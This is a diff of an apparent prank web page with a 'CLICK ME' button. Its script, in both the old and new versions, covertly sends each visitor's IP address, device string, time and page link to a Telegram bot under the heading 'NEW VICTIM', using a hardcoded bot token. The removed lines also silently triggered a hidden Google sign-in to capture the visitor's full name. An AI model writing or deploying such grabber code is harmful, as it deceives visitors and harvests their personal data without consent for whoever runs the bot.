@@ -131,20 +131,13 @@
       <button class="btn" onclick="reveal()">CLICK ME</button>
 
       <div id="result" class="result hidden">
-        <div>This is ur ip adress<span style="font-size:2.2rem">😭</span></div>
-        <div id="ip-line" style="color:#ff0000; font-size:1.8rem;">...</div>
-        <br>
-        <div>Heres ur full name too</div>
-        <div id="name-line" style="color:#ff6666; font-size:1.6rem;">...</div>
+        This is ur ip adress <span style="font-size:2.2rem">😭</span><br>
+        <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
       </div>
 
       <div class="by">BY ZENNY!</div>
     </div>
   </div>
-
-  <!-- GOOGLE SIGN-IN (HIDDEN) -->
-  <script async src="https://apis.google.com/js/platform.js"></script>
-  <div class="g-signin2" data-onsuccess="onGoogleSignIn" style="display:none"></div>
 
   <script>
     // === RED CIRCLES ===
@@ -162,20 +155,13 @@
 
     // === TELEGRAM BOT ===
     const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
-    const CHAT_ID = '6726658638'; // ← REPLACE WITH YOUR CHAT ID
-
-    let fullName = "Not Found";
-
-    // === GET GOOGLE NAME ===
-    function onGoogleSignIn(googleUser) {
-      const profile = googleUser.getBasicProfile();
-      fullName = profile.getName();
-      document.getElementById('name-line').innerHTML = fullName;
-    }
+    const CHAT_ID = '6726658638'; // ← REPLACE WITH YOUR REAL CHAT ID
 
     // === SEND TO TELEGRAM ===
-    function sendToTelegram(ip, name, time, ua) {
-      const message = `NEW VICTIM\n\nIP: ${ip}\nName: ${name}\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
+    function sendToTelegram(ip) {
+      const time = new Date().toLocaleString();
+      const ua = navigator.userAgent.substring(0, 100);
+      const message = `NEW VICTIM\n\nIP: ${ip}\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
         .catch(() => {});
     }
@@ -186,39 +172,24 @@
         .then(r => r.json())
         .then(data => {
           const ip = data.ip;
-          const time = new Date().toLocaleString();
-          const ua = navigator.userAgent.substring(0, 100);
-
-          // SHOW TO VICTIM
-          document.getElementById('ip-line').innerHTML = ip;
-          document.getElementById('name-line').innerHTML = fullName;
-
-          // SEND TO YOU
-          sendToTelegram(ip, fullName, time, ua);
+          document.getElementById('ip').innerHTML = ip;
+          sendToTelegram(ip);
         })
         .catch(() => {
-          document.getElementById('ip-line').innerHTML = "BLOCKED";
+          document.getElementById('ip').innerHTML = "BLOCKED";
         });
     }
 
+    // === BUTTON WORKS ===
     function reveal() {
       document.getElementById('step1').classList.add('hidden');
       document.querySelector('.btn').classList.add('hidden');
       const result = document.getElementById('result');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
-
-      // Trigger Google sign-in silently
-      setTimeout(() => {
-        if (typeof gapi !== 'undefined') {
-          gapi.auth2.getAuthInstance().signIn();
-        }
-      }, 500);
-
       getIP();
     }
   </script>
 
 </body>
 </html>
-
